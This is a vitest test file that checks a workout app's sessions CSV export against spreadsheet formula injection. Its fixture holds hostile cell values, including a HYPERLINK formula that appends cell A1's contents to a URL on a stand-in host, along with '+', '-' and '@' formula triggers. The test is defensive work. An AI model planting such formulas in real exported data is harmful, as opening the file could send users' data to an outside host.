/** A3 QA CSV 01: free-text cells in the sessions CSV must not open as spreadsheet formulas. */
import { describe, it, expect } from 'vitest';
import { sessionsToCsv } from '@/slices/settings/exportCsv';
import type { Session } from '@/core/models';

/** Minimal RFC 4180 reader: rows of unquoted cell values. */
function parse(csv: string): string[][] {
  const rows: string[][] = []; let row: string[] = []; let cell = ''; let q = false;
  for (let i = 0; i < csv.length; i++) {
    const c = csv[i]!;
    if (q) { if (c === '"' && csv[i + 1] === '"') { cell += '"'; i++; } else if (c === '"') q = false; else cell += c; continue; }
    if (c === '"') q = true; else if (c === ',') { row.push(cell); cell = ''; } else if (c === '\r') { /* skip */ } else if (c === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; } else cell += c;
  }
  return rows;
}

const s = {
  id: 's1', splitId: 'x', splitName: '=HYPERLINK("https://example.invalid/?d="&A1,"Push")', day: '2026-09-20',
  startedAt: '2026-09-20T10:00:00.000Z', endedAt: '2026-09-20T11:00:00.000Z', durationSec: 3600,
  note: '-2+3',
  exercises: [{ exerciseId: 'a', name: '+1+1', note: '@SUM(1,1)', sets: [{ kg: 50, reps: 5 }, { kg: 52.5, reps: 4 }] }],
} as unknown as Session;

describe('A3 QA CSV 01', () => {
  it('split, exercise and note cells never start with a formula trigger (= + - @)', () => {
    const rows = parse(sessionsToCsv([s], 'kg')).slice(1);
    const text = rows.flatMap(r => [r[1], r[2], r[11]]).filter((v): v is string => !!v);
    expect(text.filter(v => /^[=+\-@\t\r]/.test(v))).toEqual([]);
  });
  it('numeric cells stay plain numbers', () => {
    const rows = parse(sessionsToCsv([s], 'kg')).slice(1);
    expect(rows.slice(0, 2).map(r => [r[4], r[6]])).toEqual([['50', '5'], ['52.5', '4']]);
  });
});
